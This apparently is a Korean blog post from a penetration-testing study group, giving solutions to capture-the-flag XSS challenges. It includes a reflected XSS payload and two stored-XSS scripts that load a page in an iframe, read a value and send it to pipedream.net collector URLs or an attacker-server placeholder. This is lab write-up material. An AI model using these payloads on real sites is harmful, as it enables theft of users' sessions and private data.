---
layout: post
comments: true
sitemap:
    changefreq: daily
    priority: 0.5

title: "[CTF] CTF 문제 풀이: XSS - iframe"
excerpt: "모의해킹 취업반 스터디 7기 11주차"

date: 2024-12-30
last_modified_at: 

tags: [TIL, WEB]
---

# Basic Script Prac
## mypage -> reflected xss
<img src=. onerror="
let e = document.querySelectorAll('input')[1].placeholder;
let i = new Image();
i.src = 'https://eot2jevtyijbm2l.m.pipedream.net/?cookie=' + e;
">

# CTF - Steal Info
## notice_list.php
1. 저장되고 출력되는 위치 확인
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-1.gif?raw=true">

1. 특수문자 <'"> 사용 가능한 지 확인
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-2.gif?raw=true">

1. `<script>alert(1)</script>`로 XSS 공격이 가능한 지 확인
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-3.gif?raw=true">

1. data 탈취
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-4.gif?raw=true">

* 공격 코드
```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac/secret.php" id="targetIframe">
</iframe>
<script>
    let f = document.querySelector('iframe').contentWindow;
    f.addEventListener('load', () => {
        var e = f.document.getElementsByClassName('card-text')[1].textContent;
        console.log(f);
        let i = new Image();
        i.src = "[공격자 서버]/?cookie=" + e;
    })
</script>
```

# Steal Info 2
## notice_list
1. 저장되고 출력되는 위치 확인
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-5.gif?raw=true">

1. 특수문자 <'"> 사용 가능한 지 확인
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-6.gif?raw=true">

1. `<script>alert(1)</script>`로 Stored XSS 공격이 가능한 지 확인
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-7.gif?raw=true">

1. data 탈취
<img src="https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@master/_image/2024-12-30-8.gif?raw=true">

* 공격 코드
```html
<iframe src="http://ctf.segfaulthub.com:4343/scriptPrac2/mypage.php">
</iframe>
<script>
    let f = document.querySelector('iframe').contentWindow;
    f.addEventListener('load', () => {
        let e = f.document.querySelectorAll('input')[1].placeholder;
        console.log(f);
        let i = new Image();
        i.src = "https://eoxee0fw4m1u2sw.m.pipedream.net/?cookie=" + e;
    })
</script>
```